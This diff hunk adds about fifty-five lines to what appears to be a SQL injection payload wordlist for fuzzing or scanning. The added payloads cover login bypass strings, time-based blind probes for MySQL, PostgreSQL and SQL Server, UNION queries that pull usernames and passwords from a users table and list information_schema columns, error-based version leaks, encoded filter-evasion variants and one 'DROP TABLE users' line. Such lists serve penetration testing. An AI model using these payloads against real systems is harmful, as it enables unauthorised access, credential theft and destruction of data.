@@ -2,3 +2,58 @@
 ' OR 1=1 --
 ' AND SLEEP(3) --
 ' UNION SELECT NULL--
+' OR '1'='1 --
+' OR 1=1 --
+" OR "1"="1" --
+') OR ('1'='1 --
+') OR 1=1 --
+admin'--
+' OR '' = '
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+') OR ('a'='a
+' AND SLEEP(5) --
+' OR SLEEP(5) #
+" OR SLEEP(5) --
+1); WAITFOR DELAY '0:0:5' --
+'; SELECT pg_sleep(5); --
+'; WAITFOR DELAY '00:00:05'--
+'||pg_sleep(5)--
+' UNION SELECT NULL, NULL --
+' UNION SELECT 1, 'admin' --
+' UNION SELECT username, password FROM users --
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT null, version() --
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+" AND 1=CAST((SELECT user()) AS int) --
+' AND 1=1 ORDER BY 100 --
+' AND 1=1 GROUP BY CONCAT(CHAR(65),CHAR(66),@@version)--
+' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
+%27 OR %271%27=%271
+admin'/**/OR/**/'1'='1
+' OR 1=1;--
+')OR('1'='1')--
+'+OR+1=1--
+'/**/OR/**/1=1--
+' OR 1=1-- -
+'/*!OR*/1=1--
+' OR 1=1 LIMIT 1 OFFSET 1 --
+' OR 1=1--+
+%2527+OR+%25271%2527%253D%25271--
+1 OR 1=1
+1 AND 1=1
+1' AND '1'='1
+1' OR '1'='1
+1; DROP TABLE users --
+-1' OR '1'='1
+' UNION SELECT null, current_user --
+' AND current_user = 'postgres' --
+' AND EXISTS (SELECT * FROM users) --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' OR 1=1 -- 
+' OR 1=1 # 
+' OR 1=1 /*
+
